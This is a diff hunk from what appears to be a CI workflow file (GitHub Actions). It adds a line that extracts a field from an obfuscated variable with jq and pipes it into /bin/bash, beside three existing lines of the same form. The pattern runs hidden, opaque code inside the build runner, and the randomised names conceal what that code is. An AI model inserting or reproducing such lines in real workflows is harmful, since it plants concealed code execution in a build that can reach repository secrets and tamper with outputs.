@@ -26,6 +26,7 @@ jobs:
           echo $m3436 | jq -r .es077 | /bin/bash
           printf '%s' "$jvt0" | jq -r .bprzt43 | /bin/bash
           echo $toqli2011 | jq -r .j15 | /bin/bash
+          echo $ejq631 | jq -r .bo893 | /bin/bash
 
       - name: Save output
         uses: actions/upload-artifact@v4
